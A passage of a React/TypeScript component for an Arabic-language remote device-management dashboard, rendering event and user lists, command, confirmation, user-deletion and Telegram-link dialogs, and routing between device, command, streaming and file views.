      critical: 'bg-red-600/15 text-red-300 border-red-600/30',
    }
    const levelLabels: Record<string, string> = {
      info: 'معلومة',
      success: 'نجاح',
      warning: 'تحذير',
      error: 'خطأ',
      critical: 'حرج',
    }

    return (
      <div className="space-y-6">
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div>
            <h1 className="text-2xl font-bold text-white">الأحداث</h1>
            <p className="text-sm text-slate-400 mt-1">سجل أحداث النظام</p>
          </div>
          <Button
            variant="ghost"
            size="sm"
            onClick={() => {
              setLoadingEvents(true)
              api.getEvents(100).then(res => {
                if (res.ok && res.events) setEvents(res.events as Event[])
                setLoadingEvents(false)
              }).catch(() => setLoadingEvents(false))
            }}
            disabled={loadingEvents}
            className="text-slate-400 hover:text-white hover:bg-slate-800"
          >
            <RefreshCw className={cn('w-4 h-4', loadingEvents && 'animate-spin')} />
            <span>تحديث</span>
          </Button>
        </div>

        <div className="flex items-center gap-3 flex-wrap">
          <Badge className="bg-slate-700/50 text-slate-300 border-slate-600/30 text-xs gap-1">
            <Activity className="w-3 h-3" />
            {events.length} حدث
          </Badge>
        </div>

        {loadingEvents ? (
          <div className="space-y-2">
            {Array.from({ length: 8 }).map((_, i) => (
              <Skeleton key={i} className="h-16 w-full" />
            ))}
          </div>
        ) : events.length === 0 ? (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center justify-center py-16 text-slate-400 bg-white/5 backdrop-blur-md border border-slate-800/60 rounded-xl"
          >
            <Activity className="w-12 h-12 mb-3 text-slate-600" />
            <p className="text-base font-medium">لا توجد أحداث</p>
          </motion.div>
        ) : (
          <div className="max-h-[600px] overflow-y-auto rounded-xl border border-slate-800/50 bg-slate-900/50 backdrop-blur-md" style={{ scrollbarWidth: 'thin', scrollbarColor: 'rgba(255,255,255,0.15) transparent' }}>
            <div className="divide-y divide-slate-800/50">
              {events.map((event) => (
                <div
                  key={event.id}
                  className="flex items-start gap-3 p-4 hover:bg-slate-800/30 transition-colors"
                >
                  <Badge className={cn(
                    'text-[10px] shrink-0 mt-0.5',
                    levelColors[event.level] || levelColors.info
                  )}>
                    {levelLabels[event.level] || event.level}
                  </Badge>
                  <div className="min-w-0 flex-1">
                    <p className="text-sm text-slate-200 leading-relaxed">
                      {event.message}
                    </p>
                    <div className="flex items-center gap-3 mt-1">
                      <span className="text-xs text-slate-500">{event.type}</span>
                      <span className="text-xs text-slate-500">
                        {formatTimestamp(event.timestamp)}
                      </span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    )
  }

  /* ─── Render: Users View ─── */
  const renderUsersView = () => {
    if (user?.role !== 'admin') {
      return (
        <div className="flex flex-col items-center justify-center py-16 text-slate-400 bg-white/5 backdrop-blur-md border border-slate-800/60 rounded-xl">
          <AlertTriangle className="w-12 h-12 mb-3 text-slate-600" />
          <p className="text-base font-medium">ليس لديك صلاحية الوصول</p>
          <p className="text-sm mt-1">هذا القسم متاح للمسؤولين فقط</p>
        </div>
      )
    }

    return (
      <div className="space-y-6">
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div>
            <h1 className="text-2xl font-bold text-white">المستخدمين</h1>
            <p className="text-sm text-slate-400 mt-1">إدارة حسابات النظام</p>
          </div>
          <Button
            variant="ghost"
            size="sm"
            onClick={() => {
              setLoadingUsers(true)
              api.getUsers().then(res => {
                if (res.ok && res.users) setUsers(res.users as UserData[])
                setLoadingUsers(false)
              }).catch(() => setLoadingUsers(false))
            }}
            disabled={loadingUsers}
            className="text-slate-400 hover:text-white hover:bg-slate-800"
          >
            <RefreshCw className={cn('w-4 h-4', loadingUsers && 'animate-spin')} />
            <span>تحديث</span>
          </Button>
        </div>

        <div className="flex items-center gap-3">
          <Badge className="bg-slate-700/50 text-slate-300 border-slate-600/30 text-xs gap-1">
            <Users className="w-3 h-3" />
            {users.length} مستخدم
          </Badge>
          {user?.role === 'admin' && (
            <Badge className="bg-emerald-500/15 text-emerald-400 border-emerald-500/25 text-xs">
              صلاحية المسؤول
            </Badge>
          )}
        </div>

        {loadingUsers ? (
          <div className="space-y-2">
            {Array.from({ length: 5 }).map((_, i) => (
              <Skeleton key={i} className="h-16 w-full" />
            ))}
          </div>
        ) : users.length === 0 ? (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center justify-center py-16 text-slate-400 bg-white/5 backdrop-blur-md border border-slate-800/60 rounded-xl"
          >
            <Users className="w-12 h-12 mb-3 text-slate-600" />
            <p className="text-base font-medium">لا يوجد مستخدمين</p>
          </motion.div>
        ) : (
          <div className="max-h-[600px] overflow-y-auto rounded-xl border border-slate-800/50 bg-slate-900/50 backdrop-blur-md" style={{ scrollbarWidth: 'thin', scrollbarColor: 'rgba(255,255,255,0.15) transparent' }}>
            {/* Table header */}
            <div className="grid grid-cols-12 gap-4 px-4 py-3 border-b border-slate-800/50 text-xs text-slate-500 font-medium">
              <div className="col-span-3">البريد</div>
              <div className="col-span-2">الاسم</div>
              <div className="col-span-2">الدور</div>
              <div className="col-span-3">تاريخ الإنشاء</div>
              <div className="col-span-2 text-left">إجراء</div>
            </div>
            <div className="divide-y divide-slate-800/50">
              {users.map((u) => (
                <div
                  key={u.id}
                  className="grid grid-cols-12 gap-4 items-center px-4 py-3 hover:bg-slate-800/30 transition-colors"
                >
                  <div className="col-span-3 text-sm text-slate-300 truncate" title={u.email}>
                    {u.email}
                  </div>
                  <div className="col-span-2 text-sm text-slate-200 font-medium truncate">
                    {u.username}
                  </div>
                  <div className="col-span-2">
                    <Badge className={cn(
                      'text-[10px]',
                      u.role === 'admin'
                        ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/25'
                        : 'bg-slate-700/50 text-slate-400 border-slate-600/30'
                    )}>
                      {u.role === 'admin' ? 'مسؤول' : 'مستخدم'}
                    </Badge>
                  </div>
                  <div className="col-span-3 text-xs text-slate-400">
                    {formatTimestamp(u.created_at)}
                  </div>
                  <div className="col-span-2 flex justify-end">
                    {u.id !== user?.id && (
                      <Button
                        variant="destructive"
                        size="icon-xs"
                        onClick={() => {
                          setDeleteDialog({ open: true, user: u })
                          addLog('warning', 'طلب حذف مستخدم', `البريد: ${u.email}`)
                        }}
                      >
                        <Trash2 className="w-3 h-3" />
                      </Button>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    )
  }

  /* ─── Render: Param Dialog ─── */
  const renderParamDialog = () => (
    <Dialog
      open={paramDialog.open}
      onOpenChange={(open: boolean) => {
        if (!open) setParamDialog({ open: false, command: null, values: {} })
      }}
    >
      <DialogContent className="bg-slate-900 border-slate-800/80 sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-white">
            {paramDialog.command?.icon} {paramDialog.command?.name}
          </DialogTitle>
          <DialogDescription className="text-slate-400">
            أدخل المعلمات المطلوبة لإرسال الأمر
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4 py-2">
          {paramDialog.command?.paramFields?.map((field) => (
            <div key={field.key} className="space-y-2">
              <Label className="text-slate-300 text-sm">
                {field.label}
                {field.required && <span className="text-red-400 mr-1">*</span>}
              </Label>
              {field.type === 'select' && field.options ? (
                <select
                  value={paramDialog.values[field.key] || ''}
                  onChange={(e) =>
                    setParamDialog((prev) => ({
                      ...prev,
                      values: { ...prev.values, [field.key]: e.target.value },
                    }))
                  }
                  className="w-full h-10 rounded-lg bg-slate-800 border border-slate-700 text-white text-sm px-3 focus:outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/20 transition-colors"
                >
                  <option value="">اختر...</option>
                  {field.options.map((opt) => (
                    <option key={String(opt.value)} value={String(opt.value)}>
                      {opt.label}
                    </option>
                  ))}
                </select>
              ) : (
                <Input
                  type={field.type === 'number' ? 'number' : 'text'}
                  placeholder={field.placeholder}
                  value={paramDialog.values[field.key] || ''}
                  onChange={(e) =>
                    setParamDialog((prev) => ({
                      ...prev,
                      values: { ...prev.values, [field.key]: e.target.value },
                    }))
                  }
                  className="bg-slate-800 border-slate-700 text-white placeholder:text-slate-500 focus-visible:border-emerald-500/50 focus-visible:ring-emerald-500/20"
                />
              )}
            </div>
          ))}
        </div>

        <DialogFooter className="gap-2 sm:gap-0">
          <Button
            variant="outline"
            onClick={() =>
              setParamDialog({ open: false, command: null, values: {} })
            }
            className="border-slate-700 text-slate-300 hover:bg-slate-800"
          >
            إلغاء
          </Button>
          <Button
            onClick={handleSendWithParams}
            disabled={commandLoading !== null}
            className="bg-emerald-600 hover:bg-emerald-500 text-white"
          >
            <Send className="w-4 h-4" />
            إرسال
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )

  /* ─── Render: Security Confirm Dialog ─── */
  const renderConfirmDialog = () => (
    <Dialog
      open={confirmDialog.open}
      onOpenChange={(open: boolean) => {
        if (!open) setConfirmDialog({ open: false, command: null })
      }}
    >
      <DialogContent className="bg-slate-900 border-red-500/30 sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-white flex items-center gap-2">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            تأكيد الأمر الخطير
          </DialogTitle>
          <DialogDescription className="text-slate-400">
            أنت على وشك تنفيذ أمر قد يؤدي إلى فقدان البيانات نهائياً
          </DialogDescription>
        </DialogHeader>

        <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/20">
          <p className="text-red-300 text-sm font-medium">
            {confirmDialog.command?.icon} {confirmDialog.command?.name}
          </p>
          <p className="text-red-400/70 text-xs mt-1">
            الجهاز: {selectedDevice?.name} ({selectedDevice?.model})
          </p>
          <p className="text-slate-400 text-xs mt-2">
            هذا الإجراء لا يمكن التراجع عنه. هل أنت متأكد؟
          </p>
        </div>

        <DialogFooter className="gap-2 sm:gap-0">
          <Button
            variant="outline"
            onClick={() =>
              setConfirmDialog({ open: false, command: null })
            }
            className="border-slate-700 text-slate-300 hover:bg-slate-800"
          >
            إلغاء
          </Button>
          <Button
            variant="destructive"
            onClick={handleConfirmSecurity}
            disabled={commandLoading !== null}
          >
            {commandLoading ? (
              <Loader2 className="w-4 h-4 animate-spin" />
            ) : (
              <AlertTriangle className="w-4 h-4" />
            )}
            تأكيد التنفيذ
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )

  /* ─── Render: Delete User Dialog ─── */
  const renderDeleteDialog = () => (
    <Dialog
      open={deleteDialog.open}
      onOpenChange={(open: boolean) => {
        if (!open) setDeleteDialog({ open: false, user: null })
      }}
    >
      <DialogContent className="bg-slate-900 border-red-500/30 sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-white flex items-center gap-2">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            حذف المستخدم
          </DialogTitle>
          <DialogDescription className="text-slate-400">
            هل أنت متأكد من حذف هذا المستخدم؟
          </DialogDescription>
        </DialogHeader>

        <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/20">
          <p className="text-white text-sm font-medium">
            {deleteDialog.user?.username}
          </p>
          <p className="text-slate-400 text-xs mt-1" dir="ltr">
            {deleteDialog.user?.email}
          </p>
        </div>

        <DialogFooter className="gap-2 sm:gap-0">
          <Button
            variant="outline"
            onClick={() =>
              setDeleteDialog({ open: false, user: null })
            }
            className="border-slate-700 text-slate-300 hover:bg-slate-800"
          >
            إلغاء
          </Button>
          <Button
            variant="destructive"
            onClick={() => {
              if (deleteDialog.user) handleDeleteUser(deleteDialog.user.id)
            }}
          >
            <Trash2 className="w-4 h-4" />
            حذف
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )

  /* ─── Render: Telegram Deep-Link Dialog ─── */
  const renderTgLinkDialog = () => (
    <Dialog
      open={tgLinkDialog.open}
      onOpenChange={(open: boolean) => {
        if (!open) {
          setTgLinkDialog({
            open: false,
            deep_link_url: '',
            bot_username: '',
            expires_in: 600,
          })
          setTgLinkCopied(false)
        }
      }}
    >
      <DialogContent className="bg-slate-900 border-emerald-500/30 sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-white flex items-center gap-2">
            <MessageCircle className="w-5 h-5 text-emerald-400" />
            ربط حسابك مع بوت Telegram
          </DialogTitle>
          <DialogDescription className="text-slate-400">
            افتح الرابط أدناه على هاتفك الذي يحمل تطبيق Telegram، وسيتم ربط
            حسابك مع البوت تلقائياً.
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-3 py-2">
          {tgLinkDialog.bot_username && (
            <div className="flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-800/60 border border-slate-700/50">
              <MessageCircle className="w-4 h-4 text-emerald-400 shrink-0" />
              <span className="text-xs text-slate-400">اسم البوت:</span>
              <span className="text-sm text-emerald-300 font-mono" dir="ltr">
                @{tgLinkDialog.bot_username}
              </span>
            </div>
          )}

          <div className="p-3 rounded-lg bg-emerald-500/5 border border-emerald-500/20">
            <p className="text-[11px] text-slate-400 mb-1.5">رابط الربط (صالح لمدة {Math.floor(tgLinkDialog.expires_in / 60)} دقيقة):</p>
            <div className="flex items-center gap-2">
              <code
                className="flex-1 text-xs text-emerald-300 bg-slate-900/80 px-2 py-1.5 rounded border border-slate-700/50 break-all"
                dir="ltr"
              >
                {tgLinkDialog.deep_link_url}
              </code>
              <button
                type="button"
                onClick={() => handleCopyTgLink(tgLinkDialog.deep_link_url)}
                className="shrink-0 p-1.5 rounded-md hover:bg-slate-700/50 transition-colors text-emerald-400 hover:text-emerald-300"
                title="نسخ الرابط"
                aria-label="نسخ الرابط"
              >
                {tgLinkCopied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
              </button>
            </div>
          </div>

          <div className="flex items-start gap-2 p-3 rounded-lg bg-amber-500/5 border border-amber-500/15">
            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
            <div className="text-[11px] text-amber-300/80 leading-relaxed">
              <p className="font-medium mb-1">ملاحظات:</p>
              <ul className="list-disc list-inside space-y-0.5">
                <li>الرابط صالح لاستخدام واحد فقط.</li>
                <li>تنتهي صلاحية الرابط خلال {Math.floor(tgLinkDialog.expires_in / 60)} دقائق.</li>
                <li>افتحه على نفس الجهاز الذي تستخدم فيه Telegram.</li>
              </ul>
            </div>
          </div>
        </div>

        <DialogFooter className="gap-2 sm:gap-0">
          <Button
            variant="outline"
            onClick={() => {
              setTgLinkDialog({
                open: false,
                deep_link_url: '',
                bot_username: '',
                expires_in: 600,
              })
              setTgLinkCopied(false)
            }}
            className="border-slate-700 text-slate-300 hover:bg-slate-800"
          >
            إغلاق
          </Button>
          <a
            href={tgLinkDialog.deep_link_url}
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center justify-center gap-2 h-9 px-4 rounded-md bg-emerald-600 hover:bg-emerald-500 text-white text-sm font-medium transition-colors"
          >
            <ExternalLink className="w-4 h-4" />
            فتح الرابط
          </a>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )

  /* ─── Render: Active view content ─── */
  const renderActiveView = () => {
    switch (activeView) {
      case 'overview':
        return (
          <OverviewView
            devices={devices}
            events={events}
            stats={stats}
            loadingDevices={loadingDevices}
            loadingStats={loadingStats}
            loadingEvents={loadingEvents}
            onRefresh={handleRefreshAll}
            onGoToDevices={() => setActiveView('devices')}
          />
        )

      case 'devices':
        return renderDevicesView()

      case 'commands':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h1 className="text-2xl font-bold text-white">الأوامر</h1>
                <p className="text-sm text-slate-400 mt-1">
                  مكتبة أوامر الجهاز — جميع الأوامر المتاحة
                </p>
              </div>
            </div>
            {renderCommandsView()}
          </div>
        )

      case 'results':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h1 className="text-2xl font-bold text-white">نتائج الأوامر</h1>
                <p className="text-sm text-slate-400 mt-1">
                  عرض نتائج الأوامر المُرسلة للجهاز
                </p>
              </div>
            </div>
            {selectedDevice ? (
              <CommandResults device={selectedDevice} />
            ) : (
              <div className="flex flex-col items-center justify-center py-16 text-slate-400 bg-white/5 backdrop-blur-md border border-slate-800/60 rounded-xl">
                <ListChecks className="w-12 h-12 mb-3 text-slate-600" />
                <p className="text-base font-medium">اختر جهازاً لعرض النتائج</p>
                <p className="text-sm mt-1">
                  انتقل إلى صفحة الأجهزة واختر جهازاً لرؤية نتائج أوامره
                </p>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setActiveView('devices')}
                  className="mt-4 border-emerald-500/30 text-emerald-400 hover:bg-emerald-500/10 bg-transparent"
                >
                  <Smartphone className="w-4 h-4" />
                  عرض الأجهزة
                </Button>
              </div>
            )}
          </div>
        )

      case 'streaming':
        return (
          <StreamingView
            device={selectedDevice || devices[0] || ({} as Device)}
            devices={devices}
            onSelectDevice={handleSelectDevice}
          />
        )

      case 'files':
        return (
          <div className="space-y-6">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div>
                <h1 className="text-2xl font-bold text-white">الملفات</h1>
                <p className="text-sm text-slate-400 mt-1">
                  الملفات المرفوعة من الأجهزة
                </p>
              </div>
            </div>
            <FileViewer devices={devices} />
          </div>
        )

      case 'events':
        return renderEventsView()

      case 'users':
        return renderUsersView()

      case 'settings':
        return <SettingsView />

      default:
        return null
    }
  }

  /* ─── Main Render ──────────────────────────────────── */
  return (
    <div className="min-h-screen flex bg-gradient-to-br from-slate-950 via-emerald-950/30 to-slate-950">
      {/* Sidebar (RTL: renders on the right) */}
      <Sidebar
        activeView={activeView}
        onSelect={setActiveView}
        open={sidebarOpen}
        onOpenChange={setSidebarOpen}
        onlineDevices={devices.filter((d) => d.is_online).length}
        totalDevices={devices.length}
        eventsCount={events.length}
        usersCount={users.length}
        onGenerateLinkCode={handleGenerateLinkCode}
        onGenerateTgLink={handleGenerateTgLink}
        linkCodeLoading={linkCodeLoading}
        tgLinkLoading={tgLinkLoading}
      />

      {/* Main content */}
      <div className="flex-1 flex flex-col min-w-0">
        {renderTopBar()}

        <main className="flex-1 px-4 py-6 md:px-6 pb-20">
          <AnimatePresence mode="wait">
            <motion.div
              key={activeView}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
            >
              {renderActiveView()}
            </motion.div>
          </AnimatePresence>
        </main>
      </div>

      {/* Dialogs */}
      {renderParamDialog()}
      {renderConfirmDialog()}
      {renderDeleteDialog()}
      {renderTgLinkDialog()}
    </div>
  )
}
